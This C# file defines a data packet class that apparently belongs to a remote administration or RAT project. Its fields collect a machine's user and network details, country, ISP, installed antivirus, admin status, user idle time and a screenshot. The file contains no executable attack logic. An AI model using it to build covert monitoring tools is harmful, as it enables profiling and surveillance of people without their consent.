using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Resistenza.Common.Packets.MachineInformation
{
    public class ExtendedComputerInfoResponse
    {
        public string? OperatingSytem {  get; set; }
        public string? Architecture { get; set; }
        public string? Processor {  get; set; }
        public string? Memory {  get; set; }
        public string? GPU { get; set; }
        public string? Username { get; set; }
        public string? PCName { get; set; }
        public string? DomainName { get; set; }
        public string? HostName { get; set; }
        public string? SystemDrive { get; set; }
        public string? UpTime { get; set; }
        public string? MAC {  get; set; }
        public string? LanIp { get; set; }
        public string ? WanIp { get; set; }
        public string? Country {  get; set; }
        public string? ISP { get; set; }
        public string? Antivirus { get; set; }
        public string? IsAdmin { get; set; }
        public string? LocalTime { get; set; }
        public string? SecondsFromLastInput { get; set; }
        public string? MainDriveSize { get; set; }
        public byte[] ScreenshotBytes { get; set; }

        public string Type { get; set; }

        public ExtendedComputerInfoResponse()
        {
            Type = this.GetType().ToString();
        }

    }
}
